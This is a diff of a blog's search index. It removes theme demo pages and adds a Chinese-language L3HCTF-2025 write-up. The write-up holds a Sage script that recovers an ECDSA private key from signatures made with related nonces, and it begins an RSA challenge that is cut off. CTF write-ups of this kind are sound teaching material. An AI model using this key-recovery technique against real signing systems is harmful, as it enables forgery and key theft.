id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% badge text %&#125;</div></pre></td></tr></table></figure><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% badge 42 %&#125;</div></pre></td></tr></table></figure><h3 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h3><span class="badge">42</span><h2 id="警报（Alerts）"><a href="#警报（Alerts）" class="headerlink" title="警报（Alerts）"></a>警报（Alerts）</h2><p>插入一段警报文本信息，并为其指定样式。</p><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% alert [style] %&#125;</div><div class="line">   Alert string</div><div class="line">&#123;% endalert %&#125;</div></pre></td></tr></table></figure><h3 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&#123;% alert warning %&#125;</div><div class="line">Best check yo self, you&apos;re not looking too good.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert danger %&#125;</div><div class="line">Change a few things up and try submitting again.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert success %&#125;</div><div class="line">You successfully read this important alert message.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert info %&#125;</div><div class="line">This alert needs your attention, but it&apos;s not super important.</div><div class="line">&#123;% endalert %&#125;</div></pre></td></tr></table></figure><h3 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h3><div class="alert alert-warning"><i class="fa fa-bell"></i>  Best check yo self, you're not looking too good.</div><div class="alert alert-danger"><i class="fa fa-bug"></i>  Change a few things up and try submitting again.</div><div class="alert alert-success"><i class="fa fa-lightbulb-o"></i>  You successfully read this important alert message.</div><div class="alert alert-info"><i class="fa fa-info"></i>  This alert needs your attention, but it's not super important.</div>]]></content>
-      
-      <categories>
-          
-          <category> Docs </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> plugins </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Code Highlight</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/15/code-highlight/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/15/code-highlight/</url>
-      <content type="html"><![CDATA[<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// C</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// C++</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello World"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">helloWorld</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></div><div class="line">    &#123;</div><div class="line">        System.out.println(<span class="string">"Hello World"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="Assembler"><a href="#Assembler" class="headerlink" title="Assembler"></a>Assembler</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">#include</span> &lt;stdio.h&gt;</div><div class="line"></div><div class="line"><span class="symbol">char</span> format[] = <span class="string">"%s %s\n"</span><span class="comment">;</span></div><div class="line"><span class="symbol">char</span> hello[] = <span class="string">"Hello"</span><span class="comment">;</span></div><div class="line"><span class="symbol">char</span> world[] = <span class="string">"world"</span><span class="comment">;</span></div><div class="line"><span class="symbol">void</span> main( void )</div><div class="line">&#123;</div><div class="line">   __asm</div><div class="line">   &#123;</div><div class="line">      <span class="keyword">mov </span> eax, offset world</div><div class="line">      <span class="keyword">push </span>eax</div><div class="line">      <span class="keyword">mov </span> eax, offset hello</div><div class="line">      <span class="keyword">push </span>eax</div><div class="line">      <span class="keyword">mov </span> eax, offset format</div><div class="line">      <span class="keyword">push </span>eax</div><div class="line">      call printf</div><div class="line">      <span class="keyword">pop </span> ebx</div><div class="line">      <span class="keyword">pop </span> ebx</div><div class="line">      <span class="keyword">pop </span> ebx</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="Net"><a href="#Net" class="headerlink" title=".Net"></a>.Net</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// Hello World .NET</div><div class="line"></div><div class="line">#using &lt;mscorlib.dll&gt;</div><div class="line">using namespace System;</div><div class="line"></div><div class="line">int _tmain()</div><div class="line">&#123;</div><div class="line">    Console::WriteLine(S"Hello World");</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="Erlang"><a href="#Erlang" class="headerlink" title="Erlang"></a>Erlang</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">-module</span><span class="params">(hello)</span>.</div><div class="line"><span class="keyword">-export</span><span class="params">([world/<span class="number">0</span>])</span>.</div><div class="line"></div><div class="line"><span class="function"><span class="title">world</span><span class="params">()</span> -&gt;</span> io:format(<span class="string">"Hello World"</span>).</div></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/local/bin/ruby -w</span></div><div class="line">puts <span class="string">"Hello World"</span></div></pre></td></tr></table></figure><h2 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">// Texas Instruments TI-81 BASIC</div><div class="line">Prgm1:HELLO...</div><div class="line">:Disp "HELLO WORLD"</div></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin perl -w  </span></div><div class="line"><span class="keyword">print</span> (<span class="string">"Hello World"</span>);</div></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/bin/python</span></div><div class="line">print(<span class="string">"Hello World"</span>)</div></pre></td></tr></table></figure><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Hello World"</span></div></pre></td></tr></table></figure><h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">-</span><span class="title">]</span>&lt;<span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">-</span><span class="title">]</span>&lt;<span class="literal">+</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="title">[</span><span class="literal">-</span><span class="title">]</span></div><div class="line">&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">-</span><span class="title">]</span> &lt;<span class="string">.</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">-</span><span class="title">]</span>&lt;<span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span></div><div class="line"><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="title">[</span><span class="literal">-</span><span class="title">]</span>&gt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&lt;<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;<span class="literal">-</span> <span class="title">]</span>&lt;<span class="literal">+</span><span class="string">.</span><span class="title">[</span><span class="literal">-</span><span class="title">]</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></div></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=<span class="string">"Hello world\n"</span> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="Pascal"><a href="#Pascal" class="headerlink" title="Pascal"></a>Pascal</h2><figure class="highlight pascal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Program</span> HelloWorld;</div><div class="line"></div><div class="line"><span class="keyword">Begin</span></div><div class="line">  Writeln (<span class="string">'Hello World!'</span>);</div><div class="line"><span class="keyword">End</span>.</div></pre></td></tr></table></figure><h2 id="Delphi"><a href="#Delphi" class="headerlink" title="Delphi"></a>Delphi</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Delphi, thanks to C0derr</span></div><div class="line"><span class="keyword">program</span> Project1;</div><div class="line"><span class="keyword">uses</span></div><div class="line">  qdialogs;</div><div class="line"><span class="keyword">const</span></div><div class="line">  s=<span class="string">'Hello, World!'</span>;</div><div class="line"><span class="keyword">begin</span></div><div class="line">  showmessage(s);</div><div class="line"><span class="keyword">end</span>.</div></pre></td></tr></table></figure>]]></content>
-      
-      <categories>
-          
-          <category> Demo </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> highlight </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Lorem Ipsum</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/15/lorem-ipsum/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/15/lorem-ipsum/</url>
-      <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p><p><img src="/hexo-theme-freemind-blog/images/lorem-ipsum/lorem-ipsum.jpg" alt="Lorem Ipsum"></p><a id="more"></a><p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur?</p>]]></content>
-      
-      <categories>
-          
-          <category> Test </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> English </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>繁體中文測試</title>
-      <link href="/hexo-theme-freemind-blog/2013/12/25/traditional-chinese-test/"/>
-      <url>/hexo-theme-freemind-blog/2013/12/25/traditional-chinese-test/</url>
-      <content type="html"><![CDATA[<p>觀自在菩薩，行深般若波羅蜜多時，照見五蘊皆空，度一切苦厄。</p><p>舍利子，色不異空，空不異色；色即是空，空即是色。受、想、行、識，亦復如是。</p><p>舍利子，是諸法空相，不生不滅，不垢不淨，不增不減，是故空中無色，無受、想、行、識；無眼、耳、鼻、舌、身、意；無色、聲、香、味、觸、法；無眼界，乃至無意識界；無無明，亦無無明盡；乃至無老死，亦無老死盡。無苦、集、滅、道，無智亦無得，以無所得故。</p><p>菩提薩埵(<code>duǒ</code>)，依般若波羅蜜多故，心無罣礙(<code>guà ài</code>)。無罣礙，故無有恐怖，遠離顛倒夢想，究竟涅槃。三世諸佛，依般若波羅蜜多故，得阿耨多羅三藐三菩提。</p><p>故知般若波羅蜜多，是大神咒，是大明咒，是無上咒，是無等等咒，能除一切苦，真實不虛。</p><p>故說般若波羅蜜多咒，即說咒曰：</p><blockquote><p>揭諦、揭諦，波羅揭諦，波羅僧揭諦，菩提薩婆訶。</p></blockquote>]]></content>
-      
-      <categories>
-          
-          <category> Test </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 繁體 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>简体中文测试</title>
-      <link href="/hexo-theme-freemind-blog/2013/12/25/simplified-chinese-test/"/>
-      <url>/hexo-theme-freemind-blog/2013/12/25/simplified-chinese-test/</url>
-      <content type="html"><![CDATA[<p>观自在菩萨，行深般若波罗蜜多时，照见五蕴皆空，度一切苦厄。</p><p>舍利子，色不异空，空不异色；色即是空，空即是色。受、想、行、识，亦复如是。</p><p>舍利子，是诸法空相，不生不灭，不垢不净，不增不减，是故空中无色，无受、想、行、识；无眼、耳、鼻、舌、身、意；无色、声、香、味、触、法；无眼界，乃至无意识界；无无明，亦无无明尽；乃至无老死，亦无老死尽。无苦、集、灭、道，无智亦无得，以无所得故。</p><p>菩提萨埵(<code>duǒ</code>)，依般若波罗蜜多故，心无罣碍(<code>guà ài</code>)。无罣碍，故无有恐怖，远离颠倒梦想，究竟涅盘。三世诸佛，依般若波罗蜜多故，得阿耨多罗三藐三菩提。</p><p>故知般若波罗蜜多，大神咒，是大明咒，是无上咒，是无等等咒，能除一切苦，真实不虚。</p><p>故说般若波罗蜜多咒， 即说咒曰，</p><blockquote><p>揭谛揭谛 波罗揭谛 波罗僧揭谛 菩提萨婆诃</p></blockquote>]]></content>
-      
-      <categories>
-          
-          <category> Test </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 简体 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-  
-  
-    
-    <entry>
-      <title></title>
-      <link href="/hexo-theme-freemind-blog/404.html"/>
-      <url>/hexo-theme-freemind-blog/404.html</url>
-      <content type="html"><![CDATA[<!DOCTYPE HTML><html>  <head><meta charset="utf-8"><title>404 | hexo-theme-freemind</title><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta property="og:site_name" content="hexo-theme-freemind"><meta property="og:image" content="undefined"><link href="favicon.png" rel="icon"><link rel="stylesheet" href="/hexo-theme-freemind/css/themes/bootstrap.css" media="screen" type="text/css">  <link rel="stylesheet" href="/hexo-theme-freemind/css/style.css" media="screen" type="text/css">  <script src="/hexo-theme-freemind/js/jquery-2.0.3.min.js"></script>  </head>  <body><nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">  <div class="container"><button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">  <span class="sr-only">Toggle navigation</span>          <span class="icon-bar"></span>          <span class="icon-bar"></span>          <span class="icon-bar"></span></button><a class="navbar-brand" href="/hexo-theme-freemind/">Freemind</a><div class="collapse navbar-collapse nav-menu">  <ul class="nav navbar-nav"><li>  <a href="/hexo-theme-freemind/archives" title="All the articles."><i class="fa fa-archive"></i>Archives  </a></li><li>  <a href="/hexo-theme-freemind/categories" title="All the categories."><i class="fa fa-folder"></i>Categories  </a></li><li>  <a href="/hexo-theme-freemind/tags" title="All the tags."><i class="fa fa-tags"></i>Tags  </a></li><li>  <a href="/hexo-theme-freemind/about" title="About me."><i class="fa fa-user"></i>About  </a></li>  </ul></div>  </div></nav><div class="clearfix"></div>    <div class="container">    <div class="content">    <div class="page-header">  <h1>OMG, failed to find this article! </h1></div><div class="row-fluid page">  <div style="text-align: center"><div class="spell-img">  <img src="/hexo-theme-freemind/images/404.png"></div><input type="text" id="local-search-input" name="q" results="0" placeholder="Don't worry, search articles here!" class="st-search-input st-default-search-input form-control" style="margin-bottom:1em">  </div>  <div id="local-search-result"></div></div>  </div>    </div> <!-- container --><div class="container-narrow">  <footer> <p>  &copy; 2014 Joseph Pan    with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="external">Freemind</a>.    </p> </footer></div> <!-- container-narrow --><script src="/hexo-theme-freemind/js/bootstrap.min.js"></script><script src="/hexo-theme-freemind/js/search.js"></script> <script type="text/javascript">           var path = "/hexo-theme-freemind/search.xml";     searchFunc(path, 'local-search-input', 'local-search-result');   </script>  </body></html>]]></content>
-    </entry>
-    
-    <entry>
-      <title>About</title>
-      <link href="/hexo-theme-freemind-blog/about/index.html"/>
-      <url>/hexo-theme-freemind-blog/about/index.html</url>
-      <content type="html"><![CDATA[Something about me. ;-)]]></content>
-    </entry>
-    
-    <entry>
-      <title>Categories</title>
-      <link href="/hexo-theme-freemind-blog/categories/index.html"/>
-      <url>/hexo-theme-freemind-blog/categories/index.html</url>
-      <content type="html"><![CDATA[]]></content>
-    </entry>
-    
-    <entry>
-      <title>Tags</title>
-      <link href="/hexo-theme-freemind-blog/tags/index.html"/>
-      <url>/hexo-theme-freemind-blog/tags/index.html</url>
-      <content type="html"><![CDATA[]]></content>
-    </entry>
-    
-  
+<search>
+  <entry>
+    <title>L3HCTF-2025</title>
+    <url>/posts/e2e4.html</url>
+    <content><![CDATA[EzECDSA
+题面：
+import hashlibimport randomfrom ecdsa import NIST256p, SigningKeyclass FlawedNonceGenerator:    def __init__(self, n):        self.n = n        self.a = random.randrange(1, n)        self.b = random.randrange(1, n)        self.c = random.randrange(1, n)        self.last_k = random.randrange(1, n)        print(f&#x27;a,b,c = &#123;self.a,self.b,self.c&#125;&#x27;)    def generate_nonce(self):        current_k = self.last_k        next_k = (self.a * current_k**2 + self.b * current_k + self.c) % self.n        self.last_k = next_k                return current_kcurve = NIST256pn = curve.orderprivate_key = SigningKey.from_secret_exponent(random.randrange(1, n), curve=curve)d = private_key.privkey.secret_multiplierprint(f&#x27;d = &#123;d&#125;&#x27;)public_key = private_key.get_verifying_key()messages = [    b&quot;Hello player, welcome to L3HCTF 2025!&quot;,    b&quot;This is a crypto challenge, as you can probably tell.&quot;,    b&quot;It&#x27;s about ECDSA, a very... robust algorithm.&quot;,    b&quot;I&#x27;m sure there are no implementation flaws whatsoever.&quot;,    b&quot;Anyway, here are your signatures. Good luck!&quot;,    f&quot;Oh, and the flag is L3HCTF&#123;&#123;&#123;d&#125;&#125;&#125;. Don&#x27;t tell anyone!&quot;.encode(),]nonce_generator = FlawedNonceGenerator(n)f = open(&#x27;signatures.txt&#x27;, &#x27;w&#x27;)for i in range(6):    k = nonce_generator.generate_nonce()    message = messages[i]    h = int.from_bytes(hashlib.sha256(message).digest(), &#x27;big&#x27;)    R = k * curve.generator    r = R.x() % n    s_inv = pow(k, -1, n)    s = (s_inv * (h + d * r)) % n    f.write(f&quot;(h:&#123;h&#125;,r:&#123;r&#125;,s:&#123;s&#125;),\n&quot;)
+分析：
+用NIST256p这个曲线进行的ECDSA签名，其中由于这个曲线是已知的，所以n = curve.order，n是已知的，也就是我们有6组签名，而且每个k之间都有联系：
+s1=k1−1(h1+xr1)s2=k2−1(h2+xr2)⋮s6=k6−1(h6+xr6)s_1=k_1^{-1}(h_1+xr_1)\\s_2=k_2^{-1}(h_2+xr_2)\\\vdots\\s_6=k_6^{-1}(h_6+xr_6)
+s1​=k1−1​(h1​+xr1​)s2​=k2−1​(h2​+xr2​)⋮s6​=k6−1​(h6​+xr6​)
+都做一下转换即可得到6个多项式：都做一下转换即可得到6个多项式：
+都做一下转换即可得到6个多项式：
+h1+xr1−s1k1=0h2+xr2−s2k2=0⋮h6+xr6−s6k6=0h_1+xr_1-s_1k_1=0\\h_2+xr_2-s_2k_2=0\\\vdots\\
+h_6+xr_6-s_6k_6=0
+h1​+xr1​−s1​k1​=0h2​+xr2​−s2​k2​=0⋮h6​+xr6​−s6​k6​=0
+由于kik_iki​之间存在线性关系，所以最终都可以表示为k1k_1k1​的多项式，这里直接求这些多项式理想的grobner基即可得到多项式方程的解
+[x + 69788518200564789389321144350462685453109604718076361366049302823767256812650, k + 20259192668456929166524619606713276345602588639715480059091270804733464402770, a + 5429358627696695589699281230327408089193738662340759874540258774415727222303, b + 44568864543157323131751489652584342118296318663514348237122188472367311256223, c + 43731216038486108514267049101526725549282472663927075875243047123834915417678]
+题解：
+from ecdsa import NIST256p, SigningKeyfrom Crypto.Util.number import *sig = [(5832921593739954772384341732387581797486339670895875430934592373351528180781, 78576287416983546819312440403592484606132915965726128924031253623117138586396, 108582979377193966287732302562639670357586761346333866965382465209612237330851),(85517239535736342992982496475440962888226294744294285419613128065975843025446, 60425040031360920373082268221766168683222476464343035165195057634060216692194, 27924509924269609509672965613674355269361001011362007412205784446375567959036),(90905761421138489726836357279787648991884324454425734512085180879013704399530, 75779605492148881737630918749717271960050893072832415117470852442721700807111, 72740499400319841565890543635298470075267336863033867770902108413176557795256),(103266614372002123398101167242562044737358751274736728792365384600377408313142, 89519601474973769723244654516140957004170211982048028366151899055366457476708, 23639647021855356876198750083669161995553646511611903128486429649329358343588),(9903460667647154866199928325987868915846235162578615698288214703794150057571, 17829304522948160053211214227664982869100868125268116260967204562276608388692, 74400189461172040580877095515356365992183768921088660926738652857846750009205),(54539896686295066164943194401294833445622227965487949234393615233511802974126, 66428683990399093855578572760918582937085121375887639383221629490465838706027, 25418035697368269779911580792368595733749376383350120613502399678197333473802)]h = [sig[i][0] for i in range(len(sig))]r = [sig[i][1] for i in range(len(sig))]s = [sig[i][2] for i in range(len(sig))]curve = NIST256pprint(curve)n = curve.orderg = curve.generatorprint(f&#x27;n = &#123;n&#125;&#x27;)PR.&lt;x,k,a,b,c&gt; = PolynomialRing(Zmod(n))eqs = []for i in range(6):    eq = ((h[i] + x * r[i])) - s[i]*k    k = (a * k**2 + b * k + c)    eqs.append(eq)    I = PR.ideal(eqs)G = I.groebner_basis()print(G)x = -int(G[0].coefficients()[1])%nprint(f&quot;L3HCTF&#123;&#123;&#123;x&#125;&#125;&#125;&quot;)
+math_problem
+题面：
+import gmpy2from gmpy2 import *from Crypto.Util.number import *from random import randintfrom gmpy2 import invertfrom scret import flag0def myfunction(num):    output = 0    output=num**3    return outputif __name__ == &#x27;__main__&#x27;:    flag_len = len(flag)    p, q = getPrime(512), getPrime(512)    while True:        r = getPrime(512)        R = bytes_to_long(str(r).encode())        if isPrime(R):            break    n = p * q * r    hint1 = R * r    mod = myfunction(n)    hint2 = pow(3*n+1, p % (2 ** 400), mod)    m = bytes_to_long(flag)    c = pow(m, 65537, n)    print(&#x27;All data:&#x27;)    print(f&#x27;n = &#123;n&#125;&#x27;)    print(f&#x27;c = &#123;c&#125;&#x27;)    print(f&#x27;hint1 = &#123;hint1&#125;&#x27;)    print(f&#x27;hint2 = &#123;hint2&#125;&#x27;)&#x27;&#x27;&#x27;All data:n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333hint2 = 